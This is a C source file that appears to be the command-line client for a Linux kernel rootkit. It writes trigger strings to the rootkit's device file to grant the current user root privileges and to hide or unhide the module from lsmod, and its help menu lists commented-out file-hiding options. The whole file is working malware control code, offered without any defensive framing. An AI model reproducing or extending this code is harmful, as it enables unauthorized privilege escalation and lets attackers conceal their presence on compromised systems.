#include "include/commands.h"

#include "../include/debug.h"

int show_info()
{
    printf("misc device name=%s \n", RK_DRIVER);
    printf("path=/dev/%s \n", RK_DRIVER);
    printf("privesc payload=\"%s\" \n", RK_PRIVESC);
    printf("hide payload=\"%s\" \n", RK_HIDE);
    printf("unhide payload=\"%s\" \n", RK_REVEAL);

    return 0;
}

int display_help(char * filename)
{
    printf("Usage: \n");
    printf("    %s <operation>\n", filename+2);
    printf("\n");
    printf("Operations: \n");
    printf("    -h, help        Display this menu\n");
    printf("    privesc         Give root privileges to the current user\n");
    printf("    info            Display infos about the rootkit\n");
    printf("    hide            Hide the rootkit from modules list\n");
    printf("    unhide          Unhide the rootkit from module list (then allow us to remove the rootkit)\n");
    // printf("    fhide <name>    Hide a file from the file system\n");
    // printf("    funhide <name>  Unhide a file from the file system\n");

    return 0;
}

int privesc(char *driver)
{
    int ret;
    int fd = open(driver, O_WRONLY);
    const char * payload = RK_PRIVESC;

    ret = write(fd, payload, strlen(payload));

    if (ret < 0){
        CLIENT_DEBUG("Failed to write to device %s value : %s\n", driver, payload);
        return -1;
    }

    CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));

    return 0;
}

int hide(char *driver)
{
    int ret;
    int fd = open(driver, O_WRONLY);
    const char * payload = RK_HIDE;

    ret = write(fd, payload, strlen(payload));

    if (ret < 0){
        CLIENT_DEBUG("Failed to write to device %s value : %s\n", driver, payload);
        return -1;
    }

    CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));
    CLIENT_DEBUG("Rootkit should be hidden from lsmod ! \n");

    return 0;
}

int unhide(char *driver)
{
    int ret;
    int fd = open(driver, O_WRONLY);
    const char * payload = RK_REVEAL;

    ret = write(fd, payload, strlen(payload));

    if (ret < 0){
        CLIENT_DEBUG("Failed to write to device %s value : %s\n", driver, payload);
        return -1;
    }

    CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));
    CLIENT_DEBUG("Rootkit should be present in lsmod ! \n");

    return 0;
}
